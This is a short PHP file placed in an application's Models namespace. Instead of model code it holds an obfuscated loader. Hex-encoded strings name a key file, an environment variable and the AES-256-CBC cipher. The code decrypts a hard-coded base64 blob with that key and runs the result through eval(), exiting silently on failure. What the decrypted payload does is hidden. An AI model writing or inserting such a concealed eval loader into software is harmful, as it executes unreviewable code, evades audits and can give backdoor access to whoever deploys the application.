<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+xbUOcTspFq/8s9ngMnzGw==');

$c=base64_decode(

'vrW26pI3ODaX8qm93sz2rwCW64TkA5AXKp4d6E64KS9o7lAsJmiKSuKQRR6I/VMGfbh2j2yBI9Oj' .
'gJAMgQ9FhygoWyHHGtyTRpZntbucUiiVkjdZzl3SsFMiWljsDxnO14Q/zkwZ5e4D8pywpf1jbUaJ' .
'wdbRwLVWU6UDhYv9BD618GC3w6pG8IsK1XGhTjdVg79I324PhTaQAvHaqDX5CHJYhvHOAKz3o4G8' .
'gOXu1qAQ8khGbcGq89bRBhgUQ1vcoXKrMDO3QOExr96YyVnTSsALIUN9Ij0KCjeA3G8rXzLK8lij' .
'AvDG0qkUPxjh86JYGmF1iHQ4Lq9Hi596OlZbv9DF2fbpmLRRutyl7niZvqSn5latdRV8WXiSTwgX' .
'GFnRmohx1ZtEkD6Oj5tRDw2LfEUGTLXlFHkaoiTXkKJvigbnzUgOSVRN08wzvLRigXDTQrj5fCW0' .
'imawiOW2Jc2FtcX/KrsIJdhHVTT3ftKTM7NgU0xgkEF6Az4TfRA9CJGlvaxKXGmmeuziT0Y2MFLG' .
'42vukXAGnqLY6tvWA/QOetpgUZCxd1cTYb8683o+3wTcw8bKTOrf2dohhA4n05Zn3m8b5Mj7Zzau' .
'PS5iJRe9SP/yk69rgoLKGXIRowMalJFA33CfwMBLvnOaPwbiVPyo7LynPLQJ3vpwDQ/qWa9VWAxv' .
'Dqm51vGufFde8fM9aeDj+zNpIC2htwhNva7TILd9Ca9jzcLtgg8VRRZo4z00RLnXqaWn/FnbDjXf' .
'U4SMVHK057Tt9WNQUEkIuaQe/nSUzno9lbhktVI7791ILZHCDgd77meoLAq6x/pxt2v1Jxcj3aLQ' .
'exFNACGvLmu4sFo3y5ihSqTl05Gvlw1jqs36LPxczefMlOIn9bZoQM2OCHkEZ3AQpWXzrTW3Ts4w' .
'WBgMm67FBtLbetHivUUxlv+z2trcPIqGkPHjQYJqZ8lvjo+5tU1oqxACweiw2dDuuKzYyA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

